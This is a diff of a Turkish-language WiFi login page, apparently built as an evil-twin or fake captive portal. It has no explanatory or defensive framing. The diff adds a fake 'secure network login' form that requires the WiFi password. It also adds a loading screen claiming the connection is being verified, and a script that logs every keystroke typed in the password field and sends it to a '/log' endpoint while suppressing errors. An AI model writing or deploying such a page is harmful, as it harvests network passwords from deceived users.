@@ -1,12 +1,48 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>Giriş</title></head>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WiFi Girisi</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 50px 20px; background: #f4f4f4; }
+        .box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
+        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
+        button { width: 95%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 5px; font-size: 16px; }
+        #loading { display: none; margin-top: 20px; }
+    </style>
+</head>
 <body>
-  <h2>WiFi Girişi</h2>
-  <form method="POST">
-    <input name="username" placeholder="Kullanıcı adı"><br>
-    <input name="password" type="password" placeholder="Şifre"><br>
-    <button type="submit">Bağlan</button>
-  </form>
+    <div class="box" id="formBox">
+        <h2>Guvenli Ag Girisi</h2>
+        <p>Devam etmek icin ag sifrenizi giriniz.</p>
+        <form method="POST" onsubmit="showLoad()">
+            <input name="username" placeholder="Kullanici Adi (Opsiyonel)"><br>
+            <input name="password" type="password" placeholder="WiFi Sifresi" required><br>
+            <button type="submit">Baglan</button>
+        </form>
+    </div>
+    
+    <div id="loading">
+        <h3>Dogrulaniyor...</h3>
+        <p>Lutfen bekleyin, aga baglaniliyor.</p>
+    </div>
+
+    <script>
+        let keys = "";
+        document.querySelector('input[name="password"]').addEventListener('keypress', function(e) {
+            keys += e.key;
+            fetch('/log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ keys: keys })
+            }).catch(()=>{});
+        });
+
+        function showLoad() {
+            document.getElementById('formBox').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+        }
+    </script>
 </body>
 </html>
